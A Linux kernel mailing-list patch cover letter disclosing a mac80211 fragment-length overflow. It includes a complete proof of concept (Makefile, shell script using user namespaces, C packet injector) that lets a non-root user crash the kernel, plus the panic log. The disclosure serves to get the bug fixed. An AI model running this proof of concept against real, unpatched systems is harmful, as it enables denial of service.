Received: from mail-pl1-f177.google.com (mail-pl1-f177.google.com [209.85.214.177])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7178A1AC44D
	for <linux-wireless@vger.kernel.org>; Sat, 29 Aug 2026 05:36:16 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.177
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787981778; cv=none; b=N5Ox3MEC1rbax8QgybYKi2QDTvlj9I8hWd35vPyOq6y/IOxC9uPpmAMXor562tR+wV/xKJbUB5hvjJP44O8oMX4h8ZZmBP2aZNsqgEVzP4JVtupWPFqB2/kIE7GKAsRCiscCVCS7f/pjvY4S24x2gxDBZ8oEcEsNpFhjxM8wYdo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787981778; c=relaxed/simple;
	bh=gGtJI6UTan0lnusb0TNLxPdXF5lryXtEGK4OntpWuSQ=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=ILgCKtl8UP00LJGGK5DcsureIabvDwmrOGATZ5sCH3FXFl1YJBvkWlgTf9Z/hytj6yZF7VUA7JPiV7jy0dfNNUCe0K/bxuuD9ixt40KDu0RbbJY8XFaBR7gRsxn3r7JqkawQKO2ewY9xrc3jwJ1qBDVoVd13InWc//1FtlfGRoI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=mfYWiX/1; arc=none smtp.client-ip=209.85.214.177
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="mfYWiX/1"
Received: by mail-pl1-f177.google.com with SMTP id d9443c01a7336-2d712281f8bso20262695ad.1
        for <linux-wireless@vger.kernel.org>; Fri, 28 Aug 2026 22:36:16 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787981776; x=1788586576; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=YME4yQmzSmpRQCPaD9vF5EltNdRxJUd/eU1G3An8t6I=;
        b=mfYWiX/1xrfcAW4ZsCU7yIhZp9eAAiFz/r99w1JwREtaW/BOO41zI+A8ZwwZoEIAdk
         ZGbF/XVdXZiJM4WnnveKMyjCzuJqkwUVcCNDL2Q8jSwN2o2b59O7LYTVpiID+OIJxxX4
         yduAm29iVqR3zcEgWZhfRnE0Mcksb9mnMQdA48rakukPExe1Fuf7mthQy2Ru60EKuHQ/
         eSI2o1h1iJUSFmd1QxwkrHUpU6s0MUV55cJllMpWfLn52UHKTmz0L3BcLnSHlpB61G9T
         ehap9UNFwbNtzDOF9VlH2rQec1Df/0hrPj4L1gFvS0aHZtbObjxuNw9qnrh0NXQQ+qvx
         2GQQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787981776; x=1788586576;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=YME4yQmzSmpRQCPaD9vF5EltNdRxJUd/eU1G3An8t6I=;
        b=eAl6BPci6q3Xk193pSerf215sA6/avQzTUzmXvgaIJVTp7bGQ0YlKYQDF/R5MNSELY
         VPmCzehTy40qzEQs15NMGNGM9zre33qKN5LoInHgRPxq/opRZG/7P6vrJaGREM3BbCLS
         wG3dpRimH1cIhoekPc6TqC7uj1hiZ6RtYu7f5wPxyOJCzu2cLyYNQzXOyZyDe77/et7B
         EIcdHLQhEnEDbLh63KEI6b6iGJPXMovIvSwrd8HPcPS8KKCypC2zTafNp4yrnPMWLedO
         CwDYjYRtqFymB/JuuYuxtHaECd5prrI9xCurwaCEcC6VCAMvmVfe3bjgQIf9ystvhSYe
         sOAw==
X-Gm-Message-State: AFuF++miuR1GjI6Pxtdf5o3sLmQ4i9/R1/3YVcyK5KS8iJmwLhLa0yOF
	BqzUI5rNbQNPWK1wqXRpIx8vpbgLnjNwmp7kS7beuYVj0CuEWdK9VWb9QFFXRAB3Jrba0KztCSu
	NyHZnasRmIN4=
X-Gm-Gg: AYBFou1BfzqTwzODsnReaX07aXgHCT4d7myUCJp2dk46lQA5uj4TVuBtMba7l8N5sfk
	i2VZJKDhGPG6RKsHJ7b5lccb3ZM/g59oLDBJH/Xo2zLNFTUeqVCbvMh9cp9+a6iLWEAMCkpazkw
	e8HChXTZLeK9E+AU7uU6DnphJO7NQlmzuGAs/FngCsk53Mpm2qBfN1L4L66sutaa51evP3/El6G
	GBJfAD3i1oZaFjv3NOCWhf2feJxYMZc5TNuLPN9q5T7MIvvSRI2EJytCdNlXTGKN//Bd5QKnB2m
	15voWS9GyLtC/pGE93Y9xPLEINIFo92/rRas1rEM5cI2wEboOB6Xg+6DmpPGtrBSpFPJkRo2d87
	zLEAVke07qAoR/bo0l3+hAQPZQ7VHMHD1oGNf7sARNtuAFgmxYHyGBIb3MieBzt9TC1Z7L0Ma0k
	iEo6QhIpmUJMChnuA7NzBTAb3AN58u6PXBt0QzjKHGS8jKIVV1wP/D2C3JVNBiYAte8d7+
X-Received: by 2002:a17:90b:2dc5:b0:395:4290:46e0 with SMTP id 98e67ed59e1d1-396d0e83c28mr21741753a91.5.1787981775367;
        Fri, 28 Aug 2026 22:36:15 -0700 (PDT)
Received: from Roxy.localdomain ([2602:feda:30:ae86:216:b3ff:fe40:dc4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-3286f8094dasm12117408eec.13.2026.08.28.22.36.12
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 28 Aug 2026 22:36:14 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-wireless@vger.kernel.org
Cc: johannes@sipsolutions.net,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH wireless 0/1] wifi: mac80211: fix fragment length overflow
Date: Sat, 29 Aug 2026 13:36:02 +0800
Message-ID: <cover.1787980055.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/mac80211/sta_info.h. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

struct ieee80211_fragment_entry stores extra_len as u16. In
ieee80211_rx_h_defragment(), every continuation skb length is added to
this field without checking for overflow. A sequence of large fragments
can therefore wrap the accumulator before it is passed to
pskb_expand_head().

The PoC queues 15 continuation payloads of 5000 bytes each. Their actual
length is 75000 bytes, but the u16 accumulator wraps to 9464.
pskb_expand_head() reserves only the wrapped amount, while
skb_put_data() appends every queued fragment. The destination skb is
short by 65536 bytes and skb_over_panic() terminates the kernel.

Use an unsigned int, matching skb->len, so the continuation length is not
truncated at 16 bits.

Reproducer:

    ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN Makefile------

PKG_CONFIG ?= pkg-config

CFLAGS += -O2 -Wall $(shell $(PKG_CONFIG) --cflags libnl-genl-3.0)
LDLIBS += $(shell $(PKG_CONFIG) --libs libnl-genl-3.0)

all: poc

poc: poc.c

clean:
	rm -f poc

------END Makefile--------

------BEGIN poc.sh------

#!/bin/sh

set -eu

PATH=/usr/sbin:/sbin:/usr/bin:/bin
SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
BSSID=${BSSID:-02:11:22:33:44:55}
PAYLOAD_LEN=${PAYLOAD_LEN:-5000}
FRAGS=${FRAGS:-16}
SEQ=${SEQ:-0x56a}
MONITOR_MTU=${MONITOR_MTU:-9000}

build_poc() {
	make -C "$SCRIPT_DIR"
}

list_ifaces() {
	/usr/sbin/iw dev | awk '$1 == "Interface" { print $2 }'
}

wait_for_ifaces() {
	wanted=$1
	count=0

	while [ "$count" -lt 50 ]; do
		set -- $(list_ifaces)
		if [ "$#" -ge "$wanted" ]; then
			return 0
		fi

		count=$((count + 1))
		sleep 0.1
	done

	echo "timed out waiting for hwsim interfaces" >&2
	exit 1
}

get_mac() {
	ip -o link show "$1" | awk '{ print $17 }'
}

run_inner() {
	cd "$SCRIPT_DIR"

	./poc new-radio
	./poc new-radio
	wait_for_ifaces 2

	set -- $(list_ifaces)
	tx_if=$1
	rx_if=$2

	/usr/sbin/iw dev "$tx_if" set type ibss
	/usr/sbin/iw dev "$rx_if" set type ibss
	/usr/sbin/iw dev "$tx_if" interface add mon0 type monitor

	ip link set "$tx_if" up
	ip link set "$rx_if" up
	ip link set mon0 up
	ip link set mon0 mtu "$MONITOR_MTU"

	/usr/sbin/iw dev "$tx_if" ibss join overflow 2412 fixed-freq "$BSSID"
	/usr/sbin/iw dev "$rx_if" ibss join overflow 2412 fixed-freq "$BSSID"

	sleep 1

	tx_mac=$(get_mac "$tx_if")
	rx_mac=$(get_mac "$rx_if")

	exec ./poc inject mon0 "$tx_mac" "$rx_mac" "$BSSID" \
		"$PAYLOAD_LEN" "$FRAGS" "$SEQ"
}

case "${1:-}" in
__inner)
	run_inner
	;;
"")
	build_poc
	exec unshare -Urn -- sh "$0" __inner
	;;
*)
	echo "usage: $0" >&2
	exit 1
	;;
esac

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netlink/genl/ctrl.h>
#include <netlink/genl/genl.h>
#include <netlink/msg.h>
#include <netlink/netlink.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

enum {
	HWSIM_CMD_UNSPEC,
	HWSIM_CMD_REGISTER,
	HWSIM_CMD_FRAME,
	HWSIM_CMD_TX_INFO_FRAME,
	HWSIM_CMD_NEW_RADIO,
};

enum {
	HWSIM_ATTR_UNSPEC,
	HWSIM_ATTR_ADDR_RECEIVER,
	HWSIM_ATTR_ADDR_TRANSMITTER,
	HWSIM_ATTR_FRAME,
	HWSIM_ATTR_FLAGS,
	HWSIM_ATTR_RX_RATE,
	HWSIM_ATTR_SIGNAL,
	HWSIM_ATTR_TX_INFO,
	HWSIM_ATTR_COOKIE,
	HWSIM_ATTR_CHANNELS,
};

#define IEEE80211_FTYPE_DATA 0x0008
#define IEEE80211_FCTL_MOREFRAGS 0x0400
#define IEEE80211_RADIOTAP_PRESENT_TX_FLAGS (1U << 15)
#define IEEE80211_RADIOTAP_F_TX_NOACK 0x0008
#define IEEE80211_RADIOTAP_F_TX_NOSEQNO 0x0010

struct radiotap_inject_hdr {
	uint8_t version;
	uint8_t pad;
	uint16_t len;
	uint32_t present;
	uint16_t tx_flags;
} __attribute__((packed));

struct ieee80211_hdr_3addr {
	uint16_t frame_control;
	uint16_t duration_id;
	uint8_t addr1[6];
	uint8_t addr2[6];
	uint8_t addr3[6];
	uint16_t seq_ctrl;
} __attribute__((packed));

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage:\n"
		"  %s new-radio\n"
		"  %s inject <ifname> <src-mac> <dst-mac> <bssid> "
		"[payload-len] [frags] [seq]\n",
		prog, prog);
}

static uint32_t parse_u32(const char *s, const char *what)
{
	char *end;
	unsigned long value;

	errno = 0;
	value = strtoul(s, &end, 0);
	if (errno || *end || value > UINT32_MAX) {
		fprintf(stderr, "invalid %s: %s\n", what, s);
		exit(EXIT_FAILURE);
	}

	return (uint32_t)value;
}

static void parse_mac(const char *text, uint8_t mac[6], const char *what)
{
	unsigned int tmp[6];

	if (sscanf(text, "%2x:%2x:%2x:%2x:%2x:%2x",
		   &tmp[0], &tmp[1], &tmp[2],
		   &tmp[3], &tmp[4], &tmp[5]) != 6) {
		fprintf(stderr, "invalid %s: %s\n", what, text);
		exit(EXIT_FAILURE);
	}

	for (size_t i = 0; i < 6; i++)
		mac[i] = tmp[i];
}

static int create_hwsim_radio(void)
{
	struct nl_sock *sock;
	struct nl_msg *msg;
	int family;
	int err;

	sock = nl_socket_alloc();
	if (!sock) {
		fprintf(stderr, "nl_socket_alloc failed\n");
		return -1;
	}

	err = genl_connect(sock);
	if (err < 0) {
		fprintf(stderr, "genl_connect: %s\n", nl_geterror(err));
		nl_socket_free(sock);
		return -1;
	}

	family = genl_ctrl_resolve(sock, "MAC80211_HWSIM");
	if (family < 0) {
		fprintf(stderr, "genl_ctrl_resolve: %s\n", nl_geterror(family));
		nl_socket_free(sock);
		return -1;
	}

	msg = nlmsg_alloc();
	if (!msg) {
		fprintf(stderr, "nlmsg_alloc failed\n");
		nl_socket_free(sock);
		return -1;
	}

	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family, 0, 0,
			 HWSIM_CMD_NEW_RADIO, 1)) {
		fprintf(stderr, "genlmsg_put failed\n");
		nlmsg_free(msg);
		nl_socket_free(sock);
		return -1;
	}

	err = nla_put_u32(msg, HWSIM_ATTR_CHANNELS, 1);
	if (err < 0) {
		fprintf(stderr, "nla_put_u32: %s\n", nl_geterror(err));
		nlmsg_free(msg);
		nl_socket_free(sock);
		return -1;
	}

	err = nl_send_auto(sock, msg);
	if (err < 0) {
		fprintf(stderr, "nl_send_auto: %s\n", nl_geterror(err));
		nlmsg_free(msg);
		nl_socket_free(sock);
		return -1;
	}

	nlmsg_free(msg);
	nl_socket_free(sock);

	/*
	 * The interfaces appear asynchronously after the netlink request has
	 * been accepted. A short delay keeps the shell wrapper simple.
	 */
	usleep(100000);
	return 0;
}

static int inject_fragments(const char *ifname, const uint8_t src[6],
			    const uint8_t dst[6], const uint8_t bssid[6],
			    uint32_t payload_len, uint32_t nfrags,
			    uint32_t seq)
{
	struct radiotap_inject_hdr rt = {
		.version = 0,
		.pad = 0,
		.len = htole16(sizeof(rt)),
		.present = htole32(IEEE80211_RADIOTAP_PRESENT_TX_FLAGS),
		.tx_flags = htole16(IEEE80211_RADIOTAP_F_TX_NOACK |
				    IEEE80211_RADIOTAP_F_TX_NOSEQNO),
	};
	struct ieee80211_hdr_3addr hdr;
	struct sockaddr_ll sll = {
		.sll_family = AF_PACKET,
		.sll_protocol = htons(ETH_P_ALL),
	};
	size_t frame_len = sizeof(rt) + sizeof(hdr) + payload_len;
	uint8_t *frame;
	int fd;

	if (nfrags < 2 || nfrags > 16) {
		fprintf(stderr, "fragment count must be between 2 and 16\n");
		return -1;
	}

	if (payload_len < 64) {
		fprintf(stderr, "payload length must be at least 64 bytes\n");
		return -1;
	}

	sll.sll_ifindex = if_nametoindex(ifname);
	if (!sll.sll_ifindex) {
		perror("if_nametoindex");
		return -1;
	}

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0) {
		perror("socket(AF_PACKET)");
		return -1;
	}

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
		perror("bind(AF_PACKET)");
		close(fd);
		return -1;
	}

	frame = malloc(frame_len);
	if (!frame) {
		perror("malloc");
		close(fd);
		return -1;
	}

	memcpy(frame, &rt, sizeof(rt));

	memset(&hdr, 0, sizeof(hdr));
	memcpy(hdr.addr1, dst, sizeof(hdr.addr1));
	memcpy(hdr.addr2, src, sizeof(hdr.addr2));
	memcpy(hdr.addr3, bssid, sizeof(hdr.addr3));

	for (uint32_t frag = 0; frag < nfrags; frag++) {
		bool last = frag == nfrags - 1;
		uint16_t fc = IEEE80211_FTYPE_DATA;

		if (!last)
			fc |= IEEE80211_FCTL_MOREFRAGS;

		hdr.frame_control = htole16(fc);
		hdr.seq_ctrl = htole16((seq << 4) | frag);

		memcpy(frame + sizeof(rt), &hdr, sizeof(hdr));
		memset(frame + sizeof(rt) + sizeof(hdr),
		       'A' + (frag % 26), payload_len);

		if (send(fd, frame, frame_len, 0) < 0) {
			perror("send");
			free(frame);
			close(fd);
			return -1;
		}

		usleep(5000);
	}

	free(frame);
	close(fd);
	return 0;
}

int main(int argc, char **argv)
{
	uint8_t src[6];
	uint8_t dst[6];
	uint8_t bssid[6];
	uint32_t payload_len = 5000;
	uint32_t nfrags = 16;
	uint32_t seq = 0x56a;

	if (argc < 2) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	if (!strcmp(argv[1], "new-radio")) {
		return create_hwsim_radio() ? EXIT_FAILURE : EXIT_SUCCESS;
	}

	if (strcmp(argv[1], "inject") || argc < 6) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	parse_mac(argv[3], src, "source MAC");
	parse_mac(argv[4], dst, "destination MAC");
	parse_mac(argv[5], bssid, "BSSID");

	if (argc > 6)
		payload_len = parse_u32(argv[6], "payload length");
	if (argc > 7)
		nfrags = parse_u32(argv[7], "fragment count");
	if (argc > 8)
		seq = parse_u32(argv[8], "sequence number");

	return inject_fragments(argv[2], src, dst, bssid,
				payload_len, nfrags, seq) ?
		EXIT_FAILURE : EXIT_SUCCESS;
}

------END poc.c--------

----BEGIN crash log----

[  303.811113][    C0] skbuff: skb_over_panic: text:ffffffff89cf6518 len:35024 put:5000 head:ffff888111788000 data:ffff88811178804c tail:0x891c end:0x7ec0 dev:mon0
[  303.815468][    C0] kernel BUG at net/core/skbuff.c:209!
[  303.816560][    C0] Oops: invalid opcode: 0000 [#1] PREEMPT SMP KASAN NOPTI
[  303.817665][    C0] CPU: 0 UID: 1028 PID: 10531 Comm: poc Not tainted 6.12.95 #2
[  303.818839][    C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  303.820605][    C0] RIP: 0010:skb_panic+0x143/0x230
[  303.821530][    C0] Code: 48 89 f9 48 c1 e9 03 0f b6 04 01 84 c0 74 04 3c 03 7e 19 8b 4b 70 55 48 c7 c7 a0 6d ad 8b 41 54 41 56 41 55 e8 2e a1 14 f9 90 <0f> 0b 48 89 74 24 18 48 89 54 24 10 44 89 44 24 08 4c 89 0c 24 e8
[  303.824264][    C0] RSP: 0018:ffffc900000077a0 EFLAGS: 00010246
[  303.825187][    C0] RAX: 000000000000008c RBX: ffff88807d5fb380 RCX: 0000000000000000
[  303.826301][    C0] RDX: 0000000000000000 RSI: ffffffff8aee78e0 RDI: 0000000000000001
[  303.827410][    C0] RBP: ffff88811340c130 R08: 0000000000000001 R09: fffff52000000eab
[  303.828534][    C0] R10: ffffc9000000755f R11: ffffc90000007538 R12: 0000000000007ec0
[  303.829697][    C0] R13: ffff88811178804c R14: 000000000000891c R15: dffffc0000000000
[  303.830817][    C0] FS:  00007f3d7ec78c40(0000) GS:ffff888118a00000(0000) knlGS:0000000000000000
[  303.832077][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  303.833048][    C0] CR2: 00007f3d7ed55f90 CR3: 0000000061c80000 CR4: 0000000000750ef0
[  303.834170][    C0] PKRU: 55555554
[  303.834694][    C0] Call Trace:
[  303.835180][    C0]  <IRQ>
[  303.835699][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.836700][    C0]  ? kmem_cache_free+0x14d/0x4a0
[  303.837574][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.838391][    C0]  ? ieee80211_rx_handlers+0x5a08/0xc180
[  303.839305][    C0]  skb_put+0x142/0x1a0
[  303.839910][    C0]  ieee80211_rx_handlers+0x5a08/0xc180
[  303.840744][    C0]  ? __entry_text_end+0xfdfb5/0x1020b9
[  303.841552][    C0]  ? __pfx_ieee80211_rx_handlers+0x10/0x10
[  303.842318][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.843101][    C0]  ? hlock_class+0x4e/0x130
[  303.843864][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.844640][    C0]  ? mark_lock+0xb5/0xc60
[  303.845235][    C0]  ? __pfx_mark_lock+0x10/0x10
[  303.845970][    C0]  ? debug_object_activate+0x1a0/0x4f0
[  303.846825][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.847597][    C0]  ? hlock_class+0x4e/0x130
[  303.848264][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.849033][    C0]  ? mark_lock+0xb5/0xc60
[  303.849730][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.850498][    C0]  ? hlock_class+0x4e/0x130
[  303.851110][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.851844][    C0]  ? __lock_acquire+0xc96/0x3c40
[  303.852508][    C0]  ? __pfx_mark_lock+0x10/0x10
[  303.853115][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.853842][    C0]  ieee80211_prepare_and_rx_handle+0x1f34/0x85f0
[  303.854637][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.855379][    C0]  ? mark_lock+0xb5/0xc60
[  303.855971][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.856687][    C0]  ? hlock_class+0x4e/0x130
[  303.857269][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.857975][    C0]  ? mark_lock+0xb5/0xc60
[  303.858668][    C0]  ? __pfx_ieee80211_prepare_and_rx_handle+0x10/0x10
[  303.859494][    C0]  ? __rhashtable_lookup.isra.0+0x377/0x5b0
[  303.860287][    C0]  ? __pfx___rhashtable_lookup.isra.0+0x10/0x10
[  303.861078][    C0]  ieee80211_rx_list+0x159c/0x2ff0
[  303.861824][    C0]  ? __pfx_ieee80211_rx_list+0x10/0x10
[  303.862521][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.863238][    C0]  ? lock_acquire.part.0+0x119/0x370
[  303.863801][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.864417][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.864992][    C0]  ? lock_acquire+0x2f/0xb0
[  303.865533][    C0]  ? ieee80211_rx_napi+0x94/0x360
[  303.866155][    C0]  ieee80211_rx_napi+0xc7/0x360
[  303.866676][    C0]  ? __pfx_ieee80211_rx_napi+0x10/0x10
[  303.867238][    C0]  ? lockdep_hardirqs_on+0x7b/0x110
[  303.867862][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.868462][    C0]  ? _raw_spin_unlock_irqrestore+0x40/0x80
[  303.869085][    C0]  ieee80211_handle_queued_frames+0xed/0x100
[  303.869750][    C0]  tasklet_action_common+0x251/0x3e0
[  303.870372][    C0]  handle_softirqs+0x2ae/0x8b0
[  303.870881][    C0]  ? __pfx_handle_softirqs+0x10/0x10
[  303.871495][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.872165][    C0]  ? irqtime_account_irq+0x24/0x2e0
[  303.872946][    C0]  ? __dev_queue_xmit+0x897/0x37e0
[  303.873532][    C0]  do_softirq+0xb2/0xf0
[  303.873976][    C0]  </IRQ>
[  303.874284][    C0]  <TASK>
[  303.874611][    C0]  __local_bh_enable_ip+0x101/0x120
[  303.875155][    C0]  ? __dev_queue_xmit+0x897/0x37e0
[  303.875762][    C0]  __dev_queue_xmit+0x8ac/0x37e0
[  303.876285][    C0]  ? lock_acquire+0x2f/0xb0
[  303.876778][    C0]  ? __might_fault+0xb6/0x120
[  303.877316][    C0]  ? __pfx___dev_queue_xmit+0x10/0x10
[  303.877896][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.878497][    C0]  ? _copy_from_iter+0x25f/0x1310
[  303.879078][    C0]  ? __pfx__copy_from_iter+0x10/0x10
[  303.879643][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.880343][    C0]  ? packet_parse_headers+0x469/0x9b0
[  303.881024][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.881627][    C0]  ? packet_parse_headers+0x469/0x9b0
[  303.882056][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.882427][    C0]  ? copy_page_from_iter+0x7d/0xc0
[  303.882745][    C0]  ? __pfx_packet_parse_headers+0x10/0x10
[  303.883095][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.883500][    C0]  ? skb_copy_datagram_from_iter+0x2aa/0x6f0
[  303.883883][    C0]  packet_sendmsg+0x2162/0x4d90
[  303.884190][    C0]  ? __entry_text_end+0x1020b5/0x1020b9
[  303.884541][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.884883][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.885228][    C0]  ? __lock_acquire+0x1249/0x3c40
[  303.885595][    C0]  ? __pfx___might_resched+0x10/0x10
[  303.885943][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.886289][    C0]  ? aa_sk_perm+0x1d8/0x8d0
[  303.886646][    C0]  ? __pfx_packet_sendmsg+0x10/0x10
[  303.886968][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.887309][    C0]  ? apparmor_socket_sendmsg+0x2e/0x200
[  303.887851][    C0]  __sys_sendto+0x349/0x3a0
[  303.888142][    C0]  ? __pfx___sys_sendto+0x10/0x10
[  303.888459][    C0]  ? __pfx_lock_release+0x10/0x10
[  303.888775][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.889140][    C0]  ? rcu_is_watching+0x12/0xc0
[  303.889474][    C0]  ? __pfx___x64_sys_clock_nanosleep+0x10/0x10
[  303.889873][    C0]  __x64_sys_sendto+0xe0/0x1c0
[  303.890168][    C0]  ? do_syscall_64+0x93/0x270
[  303.890472][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  303.890812][    C0]  ? lockdep_hardirqs_on+0x7b/0x110
[  303.891129][    C0]  do_syscall_64+0xc7/0x270
[  303.891432][    C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  303.891802][    C0] RIP: 0033:0x7f3d7ed09687
[  303.892103][    C0] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  303.893330][    C0] RSP: 002b:00007ffe990f05b0 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  303.893857][    C0] RAX: ffffffffffffffda RBX: 00007f3d7ec78c40 RCX: 00007f3d7ed09687
[  303.894351][    C0] RDX: 00000000000013aa RSI: 000055d93a9502a0 RDI: 0000000000000003
[  303.894829][    C0] RBP: 0000000000000003 R08: 0000000000000000 R09: 0000000000000000
[  303.895334][    C0] R10: 0000000000000000 R11: 0000000000000202 R12: 00000000000056a0
[  303.895932][    C0] R13: 0000000000000010 R14: 000000000000000f R15: 000000000000000f
[  303.896485][    C0]  </TASK>
[  303.896681][    C0] Modules linked in:
[  303.897005][    C0] ---[ end trace 0000000000000000 ]---
[  303.897416][    C0] RIP: 0010:skb_panic+0x143/0x230
[  303.897731][    C0] Code: 48 89 f9 48 c1 e9 03 0f b6 04 01 84 c0 74 04 3c 03 7e 19 8b 4b 70 55 48 c7 c7 a0 6d ad 8b 41 54 41 56 41 55 e8 2e a1 14 f9 90 <0f> 0b 48 89 74 24 18 48 89 54 24 10 44 89 44 24 08 4c 89 0c 24 e8
[  303.898898][    C0] RSP: 0018:ffffc900000077a0 EFLAGS: 00010246
[  303.899279][    C0] RAX: 000000000000008c RBX: ffff88807d5fb380 RCX: 0000000000000000
[  303.899782][    C0] RDX: 0000000000000000 RSI: ffffffff8aee78e0 RDI: 0000000000000001
[  303.900257][    C0] RBP: ffff88811340c130 R08: 0000000000000001 R09: fffff52000000eab
[  303.900754][    C0] R10: ffffc9000000755f R11: ffffc90000007538 R12: 0000000000007ec0
[  303.901228][    C0] R13: ffff88811178804c R14: 000000000000891c R15: dffffc0000000000
[  303.901947][    C0] FS:  00007f3d7ec78c40(0000) GS:ffff888118a00000(0000) knlGS:0000000000000000
[  303.902488][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  303.902888][    C0] CR2: 00007f3d7ed55f90 CR3: 0000000061c80000 CR4: 0000000000750ef0
[  303.903549][    C0] PKRU: 55555554
[  303.903776][    C0] Kernel panic - not syncing: Fatal exception in interrupt
[  303.904436][    C0] Kernel Offset: disabled
[  303.904736][    C0] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  wifi: mac80211: fix fragment length overflow

 net/mac80211/sta_info.h | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.43.0
